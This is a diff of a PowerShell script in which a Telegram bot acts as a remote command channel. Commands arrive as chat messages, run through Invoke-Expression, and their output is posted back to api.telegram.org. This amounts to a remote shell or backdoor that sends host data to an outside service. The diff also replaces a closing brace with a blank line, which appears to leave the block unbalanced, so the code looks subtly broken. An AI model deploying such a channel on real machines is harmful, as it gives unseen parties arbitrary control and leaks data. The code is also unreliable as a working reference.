@@ -665,12 +665,12 @@ While ($DoNotExit)  {
                 $Commands = $CommandToRun -split "`r?`n"
 		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
 		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
-		
+		Write-Host "Command to Run: $CommandToRun"
 		#Run the command
 		Try {
 		   foreach ($Command in $Commands) {
+     			Write-Host "$Command"
      			if (![string]::IsNullOrWhiteSpace($CommandToRun)) {
-			        Write-Host "Command to Run: $CommandToRun"
    			        Invoke-Expression $CommandToRun | Out-String | ForEach-Object {
        			        $CommandToRun_Result += "`n$($_)"
     			  }
@@ -680,7 +680,7 @@ While ($DoNotExit)  {
 		Catch  {
 		  $CommandToRun_Result = $_.Exception.Message
 		   }
-		}
+		
 		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
 		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
         $pwd = pwd
